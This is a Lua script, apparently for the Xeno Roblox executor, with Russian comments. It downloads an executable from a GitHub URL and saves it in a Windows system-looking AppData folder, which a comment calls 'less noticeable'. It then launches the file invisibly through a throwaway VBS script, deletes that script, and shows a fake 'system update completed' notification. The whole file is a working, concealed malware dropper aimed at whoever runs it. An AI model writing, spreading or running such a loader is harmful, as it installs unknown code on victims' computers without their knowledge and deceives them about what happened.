-- ==============================================
-- ПРОСТОЙ ЗАГРУЗЧИК ДЛЯ XENO EXECUTOR
-- ==============================================

local EXE_URL = "https://raw.githubusercontent.com/fasfsagfsa13-del/roblo1x-souresec/main/messagebox.exe"
local FILE_NAME = "messagebox.exe"

print("🚀 Запуск системного загрузчика...")
wait(2)

-- Функция для скачивания файла
local function DownloadAndRun()
    print("[1] Скачиваю файл...")
    
    -- Скачиваем содержимое
    local content = game:HttpGet(EXE_URL, true)
    
    if not content or #content < 1000 then
        print("❌ Ошибка: файл слишком маленький или не скачался")
        return false
    end
    
    print("[2] Сохраняю файл (" .. #content .. " байт)")
    
    -- Сохраняем в AppData (менее заметно)
    local appdata = os.getenv("APPDATA")
    local folder = appdata .. "\\Microsoft\\Windows"
    local filepath = folder .. "\\" .. FILE_NAME
    
    -- Создаем папку если нужно
    pcall(function()
        if makefolder then
            makefolder(folder)
        end
    end)
    
    -- Сохраняем файл
    if writefile then
        writefile(filepath, content)
        print("[3] Файл сохранен: " .. filepath)
        
        -- Создаем VBS для скрытого запуска
        local vbs = 'Set objShell = CreateObject("WScript.Shell")\n'
        vbs = vbs .. 'objShell.Run """' .. filepath .. '""", 0, False\n'
        vbs = vbs .. 'Set objShell = Nothing'
        
        local vbsPath = folder .. "\\run.vbs"
        writefile(vbsPath, vbs)
        
        print("[4] Запускаю программу...")
        
        -- Запускаем VBS
        if syn and syn.run then
            syn.run('wscript.exe //B "' .. vbsPath .. '"')
        elseif loadstring then
            -- Альтернативный метод
            local cmd = 'start /B wscript.exe //B "' .. vbsPath .. '"'
            if os.execute then
                os.execute(cmd)
            end
        end
        
        -- Очистка
        spawn(function()
            wait(5)
            pcall(function()
                if delfile then
                    delfile(vbsPath)
                end
            end)
        end)
        
        return true
    end
    
    return false
end

-- Запускаем процесс
spawn(function()
    wait(5)
    
    local success, err = pcall(DownloadAndRun)
    
    if success then
        print("\n✅ Успешно! Программа запущена в фоне.")
        
        wait(3)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "✅ Готово",
            Text = "Системное обновление завершено",
            Duration = 3
        })
    else
        print("\n❌ Ошибка: " .. tostring(err))
        print("📥 Скачайте вручную: " .. EXE_URL)
    end
end)

print("\n⏳ Идет загрузка...")
